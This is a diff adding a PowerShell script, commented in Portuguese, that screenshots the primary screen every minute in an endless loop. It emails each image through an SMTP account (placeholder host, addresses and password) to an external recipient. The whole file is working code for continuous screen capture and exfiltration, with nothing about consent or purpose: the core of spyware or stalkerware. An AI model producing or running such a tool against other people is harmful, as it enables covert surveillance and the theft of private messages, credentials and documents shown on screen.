@@ -1,0 +1,46 @@
+# Configurações do email
+$smtpServer = "smtp.seuprovedor.com"  # Ex: smtp.gmail.com
+$smtpPort = 587
+$emailFrom = "seuemail@provedor.com"
+$emailTo = "destino@provedor.com"
+$emailUser = "seuemail@provedor.com"
+$emailPass = "SUA_SENHA_DO_EMAIL"
+
+# Pasta temporária para salvar prints
+$folder = "$env:TEMP\Prints"
+if (!(Test-Path $folder)) { New-Item -ItemType Directory -Path $folder }
+
+# Loop infinito para tirar print a cada 1 minuto
+while ($true) {
+    # Nome do arquivo com timestamp
+    $fileName = Join-Path $folder ("print_" + (Get-Date -Format "yyyyMMdd_HHmmss") + ".png")
+
+    # Captura a tela
+    Add-Type -AssemblyName System.Windows.Forms
+    Add-Type -AssemblyName System.Drawing
+    $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
+    $bitmap = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
+    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
+    $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
+    $bitmap.Save($fileName, [System.Drawing.Imaging.ImageFormat]::Png)
+    $graphics.Dispose()
+    $bitmap.Dispose()
+
+    # Enviar email
+    $smtp = New-Object Net.Mail.SmtpClient($smtpServer, $smtpPort)
+    $smtp.EnableSsl = $true
+    $smtp.Credentials = New-Object System.Net.NetworkCredential($emailUser, $emailPass)
+    $message = New-Object Net.Mail.MailMessage
+    $message.From = $emailFrom
+    $message.To.Add($emailTo)
+    $message.Subject = "Print da tela - $(Get-Date -Format 'HH:mm:ss')"
+    $message.Body = "Segue print da tela."
+    $attachment = New-Object Net.Mail.Attachment($fileName)
+    $message.Attachments.Add($attachment)
+    $smtp.Send($message)
+    $attachment.Dispose()
+    $message.Dispose()
+
+    # Espera 1 minuto
+    Start-Sleep -Seconds 60
+}
